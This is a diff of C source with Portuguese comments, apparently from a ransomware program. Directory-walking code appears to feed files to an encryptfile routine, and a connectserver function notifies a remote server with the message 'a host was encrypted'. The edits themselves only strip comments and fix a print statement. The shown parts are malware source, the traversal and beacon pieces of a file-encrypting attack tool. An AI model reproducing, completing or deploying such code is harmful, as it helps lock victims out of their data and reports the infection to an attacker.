@@ -19,25 +19,19 @@ char blacklist[][40] = {".", "..",".speech-dispatcher","X11"};
 struct dirent *getdir;
 
 void WhatIsDir(char *dir_sch){
-	/* Data Type: DIR
-	 * The DIR data type represents a directory stream.
-     */
+	
 	struct stat veirify;
 	DIR *diretorio;
 	char pathdir[1024];
 	diretorio = opendir(dir_sch);
-	/*As funções opendir () e fdopendir () retornam um ponteiro para o
-       fluxo de diretório. Em caso de erro, NULL é retornado e errno é definido
-       para indicar o erro.
-	*/
+
 	if(diretorio == NULL){
-		fprintf(stderr, "[INFO]: Ocorreu um erro ao tentar ler diretorio: %s\n", diretorio);
+		fprintf(stderr, "[INFO]: Ocorreu um erro ao tentar ler diretorio: %s\n", dir_sch);
 		return;
 	}
-	//Lendo entradas de diretorio e guardando na struct dirent getdir
+	
 	while((getdir = readdir(diretorio)) != NULL){
 
-		//Compara o elemento d_name da struct dirent, caso ele seja igual a .. ou . e pula os comandos intermediarios
 		if(strncmp(getdir->d_name,".",sizeof(getdir->d_name)) == 0 || strncmp(getdir->d_name,"..", sizeof(getdir->d_name)) == 0) continue;
 		if(strncmp(getdir->d_name,".speech-dispatcher",sizeof(getdir->d_name)) == 0 || strncmp(getdir->d_name,"X11", sizeof(getdir->d_name)) == 0) continue;
 		sprintf(pathdir , "%s%s",dir_sch , getdir->d_name);
@@ -63,7 +57,6 @@ void connectserver(){
 	int sockfd;
 	int status;
 	char buffer[100] = "[INFO]: UM HOST FOI CRIPTOGRAFADO :]\n";
-	char ip[30];
 	struct sockaddr_in my_addr = {
 		.sin_family = AF_INET,
 		.sin_port = htons(myport),
@@ -82,7 +75,7 @@ void connectserver(){
 }
 
 void encryptfile(char *name_dir){
-	int len = sizeof(getdir->d_name);
+	//int len = sizeof(getdir->d_name);
 
 	
 
